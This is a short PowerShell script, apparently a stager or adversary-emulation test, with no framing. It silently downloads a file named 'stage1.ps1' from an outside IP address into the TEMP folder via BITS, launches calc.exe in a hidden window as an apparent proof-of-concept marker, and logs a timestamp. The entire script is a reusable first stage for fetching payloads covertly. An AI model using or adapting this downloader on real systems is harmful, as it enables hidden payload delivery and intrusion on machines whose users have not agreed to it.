
[CmdletBinding()]
param(
    [string]$TargetUrl = 'http://198.51.100.17/stage1.ps1',
    [string]$PayloadPath = "$env:TEMP\stage2.bin",
    [int]$TransferTimeout = 70
)
Start-BitsTransfer -Source $TargetUrl -Destination $PayloadPath
Start-Process -FilePath "calc.exe" -WindowStyle Hidden
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
